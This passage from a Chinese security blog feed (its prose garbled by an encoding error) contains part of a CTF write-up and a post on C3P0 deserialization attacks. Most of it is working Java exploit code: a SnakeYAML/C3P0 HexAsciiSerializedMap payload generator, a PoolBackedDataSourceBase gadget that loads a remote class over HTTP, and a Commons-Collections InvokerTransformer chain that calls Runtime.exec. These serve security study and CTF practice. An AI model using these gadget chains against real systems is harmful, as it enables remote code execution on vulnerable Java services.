class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        C3P0 c3P0=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C3P0</span>();<br>        PoolBackedDataSourceBase poolBackedDataSourceBase=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<span class="hljs-comment">//æœ‰å‚æ„é€ æ–¹æ³•æ˜¯public</span><br>        Field connectionPoolDataSource=poolBackedDataSourceBase.getClass().getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        connectionPoolDataSource.setAccessible(<span class="hljs-literal">true</span>);<br>        connectionPoolDataSource.set(poolBackedDataSourceBase,c3P0);<br>        String hex=byteArrayToHexString(serialize(poolBackedDataSourceBase));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!&lt;tag:yaml.org,2002:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&gt; &#123;userOverridesAsString: \&quot;HexAsciiSerializedMap:&quot;</span> + hex + <span class="hljs-string">&quot;;\&quot;&#125;&quot;</span>;<br>        System.out.println(poc);<br><span class="hljs-comment">//        Yaml yaml=new Yaml();</span><br><span class="hljs-comment">//        yaml.load(poc);</span><br><span class="hljs-comment">//        byte[] result=serialize(poolBackedDataSourceBase);</span><br><span class="hljs-comment">//        unserialize(result);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object object) <span class="hljs-keyword">throws</span> IOException &#123;<br>        ByteArrayOutputStream byteArrayOutputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream outputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        outputStream.writeObject(object);<br>        outputStream.close();<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] s)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ByteArrayInputStream byteArrayInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(s);<br>        ObjectInputStream objectInputStream=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(byteArrayInputStream);<br>        objectInputStream.readObject();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">byteArrayToHexString</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] byteArray)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> b : byteArray) &#123;<br>            sb.append(String.format(<span class="hljs-string">&quot;%02X&quot;</span>, b));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payloadè®°å¾—URLç¼–ç ï¼š</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805004855145.png" alt="image-20240805004855145"></p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805004832508.png" alt="image-20240805004832508"></p><p>ç¯å¢ƒå˜é‡æ‹¿ä¸‹flagï¼š</p><p><img src="/2024/08/05/%E4%BB%8ECISCN2023-%E5%8D%8E%E5%8C%97-normal-snake%E7%9C%8BSnakeyaml%E5%92%8CC3P0%E7%BC%9D%E5%90%88/image-20240805004825368.png" alt="image-20240805004825368"></p><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/BUTLER/p/17473487.html">2023 ååŒ—åˆ†åŒºèµ› normal_snake - B0T1eR - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://www.aiwin.fun/index.php/archives/1677/#cl-10">CTF-Javaé¢˜è®°å½• - é¦–é¡µ|Aiwin</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C3P0</title>
    <link href="/2024/08/05/C3P0/"/>
    <url>/2024/08/05/C3P0/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>C3P0æ˜¯JDBCçš„ä¸€ä¸ªè¿æ¥æ± ç»„ä»¶ï¼Œç±»ä¼¼çš„è¿æ¥æ± ç»„ä»¶è¿˜æœ‰Druidã€DBCP</p><blockquote><p>åœ¨æ‰§è¡ŒJDBCçš„CRUDæ“ä½œæ—¶ï¼Œè‹¥æ¯æ¬¡æ“ä½œéƒ½å»ºç«‹ä¸€æ¬¡æ–°çš„æ•°æ®åº“è¿æ¥åˆ°é”€æ¯ï¼Œå¼€é”€å°±å¤ªå¤§äº†ã€‚å› æ­¤é€šè¿‡è¿æ¥æ± ï¼ˆConnection Poolï¼‰å¤ç”¨åˆ›å»ºå¥½çš„è¿æ¥ã€‚</p><p><strong>C3P0</strong>æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’ŒJNDIç»‘å®šï¼Œæ”¯æŒJDBC3è§„èŒƒå’ŒJDBC2çš„æ ‡å‡†æ‰©å±•ã€‚ ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰Hibernateã€Springç­‰ã€‚</p></blockquote><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><h3 id="URLClassLoader-http-base"><a href="#URLClassLoader-http-base" class="headerlink" title="URLClassLoader - http base"></a>URLClassLoader - http base</h3><h4 id="PoolBackedDataSourceBase-writeObject"><a href="#PoolBackedDataSourceBase-writeObject" class="headerlink" title="PoolBackedDataSourceBase#writeObject"></a><code>PoolBackedDataSourceBase#writeObject</code></h4><p>é¦–å…ˆå°è¯•åºåˆ—åŒ–å½“å‰å¯¹è±¡çš„<code>connectionPoolDataSource</code>å±æ€§ï¼Œè‹¥æŠ›å‡º<code>NotSerializableException</code>å¼‚å¸¸ï¼Œå³ä¸èƒ½åºåˆ—åŒ–ï¼Œåˆ™catchè¿™ä¸ªå¼‚å¸¸ï¼Œå¹¶ç”¨<code>ReferenceIndirector.indirectForm</code>å¤„ç†åå†åºåˆ—åŒ–ã€‚</p><p><img src="/2024/08/05/C3P0/image-20240804232020746.png" alt="image-20240804232020746"></p><p><img src="/2024/08/05/C3P0/image-20240804232139501.png" alt="image-20240804232139501"></p><p>ä»¥ä¸Šå¯è§ï¼Œè°ƒç”¨<code>connectionPoolDataSource</code>å±æ€§çš„<code>getReference()</code>ï¼Œè¿”å›åä½œä¸ºå‚æ•°å°è£…è¿›<code>ReferenceSerialized</code>å¯¹è±¡ï¼Œè€Œ<code>ReferenceSerialized</code>å®ç°çš„æ¥å£<code>IndirectlySerialized</code>ç»§æ‰¿äº†<code>Serializable</code>æ¥å£ï¼Œå› æ­¤<code>ReferenceSerialized</code>å¯è¢«åºåˆ—åŒ–ã€‚</p><p><img src="/2024/08/05/C3P0/image-20240804232326973.png" alt="image-20240804232326973"></p><h4 id="PoolBackedDataSourceBase-readObject"><a href="#PoolBackedDataSourceBase-readObject" class="headerlink" title="PoolBackedDataSourceBase#readObject"></a><code>PoolBackedDataSourceBase#readObject</code></h4><p><img src="/2024/08/05/C3P0/image-20240804232650387.png" alt="image-20240804232650387"></p><p>è‹¥ä¼ è¿›æ¥çš„åºåˆ—åŒ–å¯¹è±¡æ˜¯ä¸Šæ–‡çš„<code>ReferenceSerialized</code>ï¼Œè¿™é‡Œè°ƒç”¨å…¶<code>getObject</code>æ–¹æ³•ï¼š</p><p><img src="/2024/08/05/C3P0/image-20240804232803817.png" alt="image-20240804232803817"></p><p>è·Ÿè¿›<code>ReferenceableUtils.referenceToObject()</code>ï¼š</p><p><img src="/2024/08/05/C3P0/image-20240804233055575.png" alt="image-20240804233055575"></p><p>refï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„var0ï¼Œæ˜¯ä¹‹å‰åºåˆ—åŒ–æ—¶å€™å¯æ§çš„ï¼Œå¯ä»¥é€šè¿‡URLClassLoaderåŠ è½½å¹¶å®ä¾‹åŒ–è¿œç¨‹ç±»ã€‚</p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>è¦è®©<code>connectionPoolDataSource</code>è¿™ä¸ªå±æ€§æ˜¯ä¸ªå®ç°<code>ConnectionPoolDataSource</code>ã€<code>Referenceable</code>ï¼ˆåé¢è¦è°ƒç”¨å®ƒçš„<code>getReference()</code>å†æ‹¿å»å°è£…åˆ°<code>ReferenceSerialized</code>ï¼‰è¿™ä¸¤ä¸ªæ¥å£çš„ç±»ã€‚é‡å†™<code>getReference()</code>æ–¹æ³•ï¼Œè®©å…¶<code>factoryLoaction</code>æŒ‡å‘æ¶æ„ç±»æ‰€åœ¨æœåŠ¡å™¨åœ°å€ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evil</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable&#123;<br><br>    <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>);<br>    &#125;<br><span class="hljs-comment">// override</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä½œä¸º<code>PoolBackedDataSourceBase</code>ï¼ˆè¿™ä¸ªç±»æœ¬èº«æœ‰å®ç°<code>Serializable</code>æ¥å£ï¼‰çš„<code>connectionPoolDataSource</code>å±æ€§ï¼Œç”±äºevilç±»æ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£ï¼Œæ— æ³•ååºåˆ—åŒ–ã€‚</p><p>åœ¨è°ƒç”¨<code>writeObject</code>æ—¶ï¼Œè°ƒç”¨<code>evil</code>çš„<code>getReference()</code>æ–¹æ³•ï¼Œè¿”å›å€¼å°è£…è¿›å¯åºåˆ—åŒ–çš„<code>ReferenceSerialized</code>å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        cp.setAccessible(<span class="hljs-literal">true</span>);<br>        cp.set(base, <span class="hljs-keyword">new</span> <span class="hljs-title class_">evil</span>());<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(base);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evil</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable&#123;<br><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;calc&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/05/C3P0/image-20240804235535113.png" alt="image-20240804235535113"></p><h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><p>PoolBackedDataSourceåœ¨åºåˆ—åŒ–æ—¶å¯ä»¥ä¼ å…¥ä¸€ä¸ªä»»æ„Referenceç±»ï¼Œåœ¨PoolBackedDataSourceååºåˆ—åŒ–æ—¶è¯¥Referenceç±»ä¸­æŒ‡å®šçš„å¯¹è±¡ä¼šè¢«URLClassLoaderè¿œç¨‹åŠ è½½å®ä¾‹åŒ–ã€‚</p><h3 id="hex-base-ä¸å‡ºç½‘åˆ©ç”¨"><a href="#hex-base-ä¸å‡ºç½‘åˆ©ç”¨" class="headerlink" title="hex base ä¸å‡ºç½‘åˆ©ç”¨"></a>hex base ä¸å‡ºç½‘åˆ©ç”¨</h3><p><code>WrapperConnectionPoolDataSourceBase#setuserOverridesAsString</code></p><p>çœ‹åˆ°setæ–¹æ³•åº”è¯¥ç«‹åˆ»è”æƒ³åˆ°fastjson</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">WrapperConnectionPoolDataSourceBaseæ˜¯æŠ½è±¡ç±»ï¼Œå…³æ³¨å…¶å­ç±»WrapperConnectionPoolDataSource<br></code></pre></td></tr></table></figure><p><code>setUserOverridesAsString</code>æœ€åèµ°åˆ°<code>C3P0ImplUtils.parseUserOverridesAsString(this.getUserOverridesAsString())</code>ï¼š</p><p><img src="/2024/08/05/C3P0/image-20240805000141646.png" alt="image-20240805000141646"></p><p>é¦–å…ˆå¯¹<code>userOverridesAsString</code>è¿›è¡Œæˆªå–ï¼Œè½¬ä¸º<code>byte[]</code>ï¼Œå†è°ƒç”¨<code>SerializableUtils.fromByteArray(serBytes)</code>ï¼Œè¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼š</p><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">getPayLoad</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;HexAsciiSerializedMap:&quot;</span> + bytesToHexString(baos.toByteArray()) + <span class="hljs-string">&quot;p&quot;</span>;<br>        <span class="hljs-type">WrapperConnectionPoolDataSource</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WrapperConnectionPoolDataSource</span>();<br>        <span class="hljs-comment">// Thread.sleep(1000*3);</span><br>        exp.setUserOverridesAsString(ser);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toByteArray(InputStream in) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">byte</span>[] classBytes;<br>        classBytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[in.available()];<br>        in.read(classBytes);<br>        in.close();<br>        <span class="hljs-keyword">return</span> classBytes;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHexString</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bArray)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> bArray.length;<br>        <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(length);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sTemp</span> <span class="hljs-operator">=</span> Integer.toHexString(<span class="hljs-number">255</span> &amp; bArray[i]);<br>            <span class="hljs-keyword">if</span> 